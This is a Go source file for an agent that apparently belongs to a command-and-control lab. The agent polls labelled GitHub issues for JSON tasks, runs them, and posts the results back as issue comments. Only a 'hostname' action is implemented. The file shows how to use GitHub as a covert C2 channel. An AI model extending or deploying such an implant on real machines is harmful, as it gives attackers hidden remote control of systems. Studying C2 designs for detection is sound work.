package main

import (
    "context"
    "encoding/json"
    "log"
    "os"
    "os/exec"
    "strings"
    "time"

    "c2lab/shared"

    "github.com/google/go-github/v60/github"
    "golang.org/x/oauth2"
)

const pollInterval = 10 * time.Second

var (
    githubToken string
    githubOwner string
    githubRepo  string
    agentID     string
    taskLabel   string // MUST match the controller's TASK_LABEL
    doneLabel   string
)

func loadConfig() {
    githubToken = mustEnv("GITHUB_TOKEN")
    githubOwner = mustEnv("GITHUB_OWNER")
    githubRepo  = mustEnv("GITHUB_REPO")
    agentID     = mustEnv("AGENT_ID")
    taskLabel   = getEnvDefault("TASK_LABEL", "c2-task")
    doneLabel   = getEnvDefault("DONE_LABEL", "c2-done")
}

func main() {
    loadConfig()

    ctx := context.Background()
    client := newGitHubClient(ctx)
    log.Printf("agent %s polling every %s (label: %s)", agentID, pollInterval, taskLabel)

    for {
        opts := &github.IssueListByRepoOptions{
            Labels: []string{taskLabel},
            State:  "open",
        }
        issues, _, err := client.Issues.ListByRepo(ctx, githubOwner, githubRepo, opts)
        if err != nil {
            log.Printf("list issues: %v", err)
            time.Sleep(pollInterval)
            continue
        }

        for _, issue := range issues {
            if hasLabel(issue, doneLabel) {
                continue
            }

            var task shared.Task
            if err := json.Unmarshal([]byte(issue.GetBody()), &task); err != nil {
                continue
            }
            if task.AgentID != agentID {
                continue
            }

            log.Printf("executing task %s: %s", task.TaskID, task.Action)
            result := executeTask(task)
            body, _ := json.Marshal(result)

            if _, _, err := client.Issues.CreateComment(ctx, githubOwner, githubRepo, issue.GetNumber(), &github.IssueComment{
                Body: github.String(string(body)),
            }); err != nil {
                log.Printf("post comment: %v", err)
                continue
            }

            if _, _, err := client.Issues.AddLabelsToIssue(ctx, githubOwner, githubRepo, issue.GetNumber(), []string{doneLabel}); err != nil {
                log.Printf("add done label: %v", err)
            }
            log.Printf("posted result for task %s", task.TaskID)
        }

        time.Sleep(pollInterval)
    }
}

func executeTask(t shared.Task) shared.Result {
    switch t.Action {
    case "hostname":
        out, err := exec.Command("hostname").CombinedOutput()
        if err != nil {
            return shared.Result{TaskID: t.TaskID, Output: err.Error(), Status: "error"}
        }
        return shared.Result{
            TaskID: t.TaskID,
            Output: strings.TrimSpace(string(out)),
            Status: "success",
        }
    default:
        return shared.Result{
            TaskID: t.TaskID,
            Output: "unsupported action: " + t.Action,
            Status: "error",
        }
    }
}

func newGitHubClient(ctx context.Context) *github.Client {
    ts := oauth2.StaticTokenSource(&oauth2.Token{AccessToken: githubToken})
    tc := oauth2.NewClient(ctx, ts)
    return github.NewClient(tc)
}

func hasLabel(issue *github.Issue, name string) bool {
    for _, l := range issue.Labels {
        if l.GetName() == name {
            return true
        }
    }
    return false
}

func mustEnv(key string) string {
    v := os.Getenv(key)
    if v == "" {
        log.Fatalf("missing required environment variable: %s", key)
    }
    return v
}

func getEnvDefault(key, def string) string {
    if v := os.Getenv(key); v != "" {
        return v
    }
    return def
}